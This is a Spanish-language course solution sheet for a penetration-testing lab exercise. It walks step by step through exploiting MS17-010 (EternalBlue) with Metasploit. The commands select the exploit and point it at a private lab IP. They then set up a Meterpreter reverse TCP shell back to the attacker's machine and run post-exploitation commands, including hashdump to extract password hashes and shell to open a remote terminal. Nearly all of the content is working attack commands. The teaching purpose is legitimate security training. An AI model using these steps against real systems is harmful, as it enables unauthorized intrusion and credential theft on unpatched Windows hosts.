
# Solución: Práctica 04 - Fase de Explotación con Metasploit

## Paso 1: Iniciar Metasploit Framework
Inicia Metasploit en tu terminal:
```
msfconsole
```
**Explicación:** Este comando inicia la interfaz interactiva de Metasploit Framework.

---

## Paso 2: Buscar un exploit específico
Utiliza el comando `search` para localizar un exploit relevante:
```
search type:exploit name:ms17_010
```
**Explicación:** Esto busca el exploit relacionado con la vulnerabilidad MS17-010 (EternalBlue).

---

## Paso 3: Seleccionar el exploit
Selecciona el exploit encontrado en el paso anterior:
```
use exploit/windows/smb/ms17_010_eternalblue
```
**Explicación:** Esto carga el módulo del exploit en la consola de Metasploit.

---

## Paso 4: Configurar parámetros del exploit
Configura la dirección IP del objetivo:
```
set RHOSTS 192.168.1.10
```
**Explicación:** El parámetro `RHOSTS` define la dirección IP del sistema objetivo.

---

## Paso 5: Configurar el payload
Selecciona un payload compatible, como un shell reverso:
```
set PAYLOAD windows/x64/meterpreter/reverse_tcp
```
Configura la dirección IP local y el puerto de escucha:
```
set LHOST 192.168.1.20
set LPORT 4444
```
**Explicación:** `LHOST` es la IP de tu máquina y `LPORT` el puerto que escuchará el payload.

---

## Paso 6: Ejecutar el exploit
Lanza el ataque contra el objetivo:
```
exploit
```
**Explicación:** Esto inicia el proceso de explotación y, si tiene éxito, establecerá una sesión con el sistema objetivo.

---

## Paso 7: Post-explotación
Usa los comandos de Meterpreter para obtener más información o control del sistema:
```
sysinfo       # Obtiene información del sistema
hashdump      # Extrae hashes de contraseñas
shell         # Abre una terminal del sistema objetivo
```
**Explicación:** Meterpreter es una herramienta potente para realizar acciones posteriores a la explotación.
